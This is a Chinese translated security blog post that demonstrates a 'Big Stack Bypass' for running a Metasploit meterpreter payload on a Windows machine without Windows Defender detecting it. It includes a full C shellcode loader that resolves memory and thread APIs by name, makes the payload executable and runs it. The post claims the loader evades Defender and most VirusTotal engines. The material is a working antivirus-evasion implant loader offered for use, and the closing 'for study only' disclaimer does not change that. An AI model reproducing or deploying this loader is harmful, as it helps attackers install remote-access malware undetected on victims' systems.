<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/czonInbkI_gwvts94vCDfA)

    本文为翻译文章，有兴趣的师傅可点击阅读原文查看。

    使用大堆栈方式，让 msf 的 payload 成功绕过 windows defender 和其他防护软件。这篇文章的目的是通过在一个启用了 WindowsDefender 的 Windows 系统上实现一个获取 meterpreter 会话，来证明 Big Stack Bypass 的有效性。

    我们从一个未加密和未编码的 meterpreter 二进制有效载荷开始。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNIoRyvNwYbXfnfpT4icD2gF4dec0q71IffV8q34ddJTianXBibjSgLw8Y0g/640?wx_fmt=png)

    在开始之前我们先保证这个过程是正确的，也就是运行载荷后可以获取一个正常的 msf 会话。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNIleRibKgnXKEkOdcVDMyDicibj70ROr36Fhm0FKehFIeSr8LpzAFiaQp7SA/640?wx_fmt=png)

    运行载荷后收到会话，说明整个过程无误。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNIHtZTz8omawfbVEokyraFicwchMmQbzCIhXK7xaTnLnt0oJ3HAvMj5NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNIt0fT2cCadYlb0DTXU3uicmpS34pDCj6svlQ3qwZHnsMYKaq3MvD5MlQ/640?wx_fmt=png)

我们注意到，有效载荷约为 200KB。我们把它粘贴到我们在最初的大堆栈绕过写法中使用的代码模板中。

```
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <random>
typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateThread_t)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);
unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};
unsigned char sCreateThread[] = {'C','r','e','a','t','e','T','h','r','e','a','d',0x0,};
int main(VOID) {
  //plain meterpreter payload
  Unsigned char payload[] = {[…snip…]}
  size_t payload_len = sizeof(payload);
  void * exec_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;
  //function pointers
  VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) "KErnEl32.DLl"), (LPCSTR) sVirtualAlloc);
  VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sVirtualProtect);
  CreateThread_t CreateThread_p = (CreateThread_t) GetProcAddress(GetModuleHandle((LPCSTR) "kERnEl32.DLl"), (LPCSTR) sCreateThread);
  // Allocate a memory buffer for payload
  exec_mem = VirtualAlloc_p(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  // Copy payload to program memory ; this gets inlined
  RtlMoveMemory(exec_mem, payload, payload_len);
  // Make payload executable
  rv = VirtualProtect_p(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
  printf("\nLaunch Payload?\n");
  getchar();
  // Run payload
  if ( rv != 0 ) {
    th = CreateThread_p(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
  }
  return 0;
}

```

现在让我们关闭原有会话，看看我们是否可以绕过 Defender。

当我们把植入物放到我们的测试文件夹中时，没有发生任何事情。ThreatCheck 确认它被标记为安全。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNI9uibfC6HKgKmN1Gtue9ju5mEb58Z6yMg9DGp9XN9Gnjw884PEOp1qlA/640?wx_fmt=png)

运行载荷，获取 session

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNI2BIfw1GiaUiay8weMtjRyAIjmc7z9CDCQfqYWsickq5cEDfUEiaZNRA9UQ/640?wx_fmt=png)

该技术也绕过了 VT 上的大部分 AV。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Xz1Aib4UshVhBJy1mAescNIrb8V1piagXONWKTwW0YRrXMS9kdmpwCMlENyZygNNibIoyuoyfqVxlJA/640?wx_fmt=png)

  

  

  

  

  

     ▼

更多精彩推荐，请关注我们

▼

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)